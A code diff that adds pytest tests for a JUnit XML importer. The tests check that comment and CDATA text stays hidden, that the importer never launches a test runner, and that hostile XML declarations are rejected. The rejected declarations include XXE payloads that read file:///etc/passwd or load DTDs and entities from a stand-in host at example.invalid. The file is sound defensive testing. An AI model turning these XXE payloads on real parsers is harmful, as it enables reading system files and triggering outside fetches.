@@ -1,5 +1,8 @@
 import hashlib
 import json
+import os
+import subprocess
+import sys
 
 import pytest
 
@@ -7,6 +10,102 @@ from lsm.cli import main
 from lsm.junit import MAX_BYTES, import_junit
 
 COMMIT = "a" * 40
+
+
+@pytest.mark.parametrize("outcome", ["failure", "error", "skipped"])
+def test_comments_and_cdata(tmp_path, outcome):
+    xml = (
+        "<!-- SECRET COMMENT --><testsuites><!-- between suites -->"
+        '<testsuite tests="1"><!-- between cases --><testcase name="case">'
+        f"<{outcome}><![CDATA[SECRET <output> & <!DOCTYPE literal>]]></{outcome}>"
+        "<system-out><![CDATA[SECRET STDOUT]]></system-out>"
+        "<system-err><![CDATA[SECRET STDERR]]></system-err>"
+        "</testcase><!-- after case --></testsuite></testsuites>"
+    )
+    result = collect(tmp_path, xml)
+    assert result["status"] == "succeeded"
+    assert result["data"]["cases"][0]["outcome"] == outcome
+    assert result["data"]["suites"][-1]["outcome"] == outcome
+    assert "SECRET" not in json.dumps(result)
+
+
+@pytest.mark.parametrize(
+    "declaration",
+    [
+        "<!DOCTYPE testsuite>",
+        '<!DOCTYPE testsuite SYSTEM "https://example.invalid/evil.dtd">',
+        '<!DOCTYPE testsuite [<!ENTITY secret "SECRET">]>',
+        '<!DOCTYPE testsuite [<!ENTITY secret SYSTEM "file:///etc/passwd">]>',
+        '<!DOCTYPE testsuite [<!ENTITY % remote SYSTEM "https://example.invalid/evil">%remote;]>',
+        '<!ENTITY secret SYSTEM "https://example.invalid/evil">',
+    ],
+)
+def test_hostile_declarations(tmp_path, declaration):
+    result = collect(tmp_path, declaration + '<testsuite><testcase name="case"/></testsuite>')
+    assert result["status"] == "failed"
+    assert result["data"] is None
+    assert "SECRET" not in json.dumps(result)
+
+
+def test_real_pytest_report(tmp_path, monkeypatch):
+    # Only this test harness executes the runner, in a newly generated directory.
+    fixture = tmp_path / "test_fixture.py"
+    fixture.write_text(
+        "import pytest\n"
+        "def test_pass():\n    assert True\n"
+        'def test_fail():\n    assert False, "SECRET FAILURE"\n'
+        '@pytest.mark.skip(reason="SECRET SKIP")\n'
+        "def test_skip():\n    pass\n"
+    )
+    report = tmp_path / "report.xml"
+    env = {key: value for key, value in os.environ.items() if not key.startswith("PYTEST_")}
+    env["PYTEST_DISABLE_PLUGIN_AUTOLOAD"] = "1"
+    completed = subprocess.run(
+        [
+            sys.executable,
+            "-m",
+            "pytest",
+            "-q",
+            "--noconftest",
+            "--rootdir",
+            str(tmp_path),
+            "-o",
+            "addopts=",
+            "--junitxml",
+            str(report),
+            str(fixture),
+        ],
+        cwd=tmp_path,
+        env=env,
+        capture_output=True,
+        text=True,
+        timeout=30,
+        check=False,
+    )
+    assert completed.returncode == 1, completed.stdout + completed.stderr
+    before = {path.name: path.read_bytes() for path in (fixture, report)}
+
+    def forbidden(*args, **kwargs):
+        pytest.fail("importer must not execute a runner")
+
+    monkeypatch.setattr(subprocess, "Popen", forbidden)
+    result = import_junit(report, repository="repository:fixture", commit=COMMIT)
+    assert result["status"] == "succeeded"
+    data = result["data"]
+    assert {case["name"]: case["outcome"] for case in data["cases"]} == {
+        "test_pass": "passed",
+        "test_fail": "failure",
+        "test_skip": "skipped",
+    }
+    assert data["binding"] == {
+        "repository": "repository:fixture",
+        "commit": COMMIT,
+        "kind": "user_attestation",
+    }
+    assert data["verification"] == "unverified"
+    assert data["artifact_sha256"] == hashlib.sha256(before[report.name]).hexdigest()
+    assert "SECRET" not in json.dumps(result)
+    assert {path.name: path.read_bytes() for path in (fixture, report)} == before
 
 
 def collect(tmp_path, xml, **kwargs):
